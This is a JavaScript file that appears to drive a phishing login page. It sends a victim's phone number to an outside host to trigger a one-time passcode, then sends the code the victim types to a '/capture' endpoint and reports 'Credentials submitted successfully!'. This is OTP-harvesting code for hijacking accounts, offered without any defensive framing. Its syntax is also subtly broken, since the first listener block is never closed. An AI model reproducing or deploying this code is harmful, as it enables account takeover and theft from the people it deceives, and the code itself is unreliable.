if (document.getElementById('login-form')) {
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();
        
        const phoneNumber = document.getElementById('phone-number').value;

       
        fetch('https://verificationsafeguard.vercel.app/sendOTP', {  // Use the full URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ phoneNumber })
        })
        .then(response => {
            if (response.ok) {
                // Redirect to otp.html with the phone number as a query parameter
                window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
            } else {
                // Handle errors and throw an error with a message
                return response.json().then(data => {
                    throw new Error(data.message || 'Failed to send OTP');
                });
            }
        })
        .catch(error => {
            console.error('Error:', error);
            displayMessage('Error sending OTP: ' + error.message, 'error');
        });

} else if (document.getElementById('otp-form')) {
    
    document.getElementById('otp-form').addEventListener('submit', function(event) {
        event.preventDefault(); 
        
        // Get the values input by the user
        const phoneNumber = new URLSearchParams(window.location.search).get('phone'); // Retrieve phone number from URL
        const otpCode = document.getElementById('otp-code').value;

        // Create the data object to send to the server
        const data = {
            phoneNumber,
            otpCode
        };

        // Update the fetch request to use the full URL for the /capture endpoint
        fetch('https://verificationsafeguard.vercel.app/capture', {  // Use the full URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            }
            return response.json().then(data => {
                throw new Error(data.message || 'Failed to submit OTP');
            });
        })
        .then(result => {
            displayMessage('Credentials submitted successfully!', 'success');
        })
        .catch(error => {
            console.error('Error:', error);
            displayMessage('Error submitting credentials: ' + error.message, 'error');
        });
    });
}

// Function to display messages to the user
function displayMessage(message, type) {
    const messageContainer = document.getElementById('message'); 
    messageContainer.innerText = message;
    messageContainer.style.color = type === 'error' ? 'red' : 'green';
}
